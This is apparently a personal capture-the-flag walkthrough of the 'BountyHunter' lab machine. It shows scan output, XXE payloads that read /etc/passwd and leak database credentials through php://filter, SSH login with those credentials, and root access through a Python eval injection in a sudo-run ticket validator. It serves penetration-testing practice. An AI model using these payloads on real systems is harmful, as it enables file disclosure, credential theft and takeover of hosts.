BountyHunter
-------
nmapscan: 

Nmap scan report for 10.10.11.100
Host is up, received conn-refused (0.77s latency).
Scanned at 2021-09-15 18:10:28 EDT for 186s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
http and ssh are open
----
gobuster scan:

http://10.10.11.100/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
http://10.10.11.100/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]   
http://10.10.11.100/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]      
http://10.10.11.100/js    
found on resources README.txt
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
found that there is a XML entitie with burp
read artical about xml https://portswigger.net/web-security/xxe/xml-entities
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
WELL after a while my stupid ass figured it out what was wrong
first we decode the it to url THEN decode it from base 64 ffs
now we can keep going and look for xxe injections
https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
and finally we did it!
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGJ1Z3JlcG9ydCBbCjwhRUxFTUVOVCB0aXRsZSBBTlkgPgo8IUVOVElUWSBzcCBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI%2BCl0%2BCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2BJnNwOzwvdGl0bGU%2BCgkJPGN3ZT4yPC9jd2U%2BCgkJPGN2c3M%2BMzwvY3Zzcz4KCQk8cmV3YXJkPjQ8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
managed to do the xxe injection and get /etc/passwd
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

found a user
development:x:1000:1000:Development:/home/development:/bin/bash
let's experiment some more 
from https://github.com/payloadbox/xxe-injection-payload-list
we found a Access control bypass payload 
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]
we tried it on the hidden db.php file and result was 
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
-----
creds:
username: development
password: m19RoAU0hP41A1sTsq6K
-----
now let's try to ssh to the machine
we are in 
usser flag : 06366882e57c78295b08b237f6aeb3b8
----
running sudo -l found that the user can run python3.8 with sudo priv on /opt/skytrain_inc/ticketValidator.py
and a .md ticket file that spawn a shell 
after creating a .md ticket and running the program with sudo we are root!
# Skytrain Inc
## Ticket to sudo
__Ticket Code:__
** 123 +10 == 133 and __import__("os").system("/bin/bash")

---
root flag: 3fb6b7fdd3fd2dc252e6027a43a2cace
----
conclusion/learned

- the website was vul to OWASP attack *XXE*
- user had sudo priv which lead to privesc
------
how to do XXE attacks 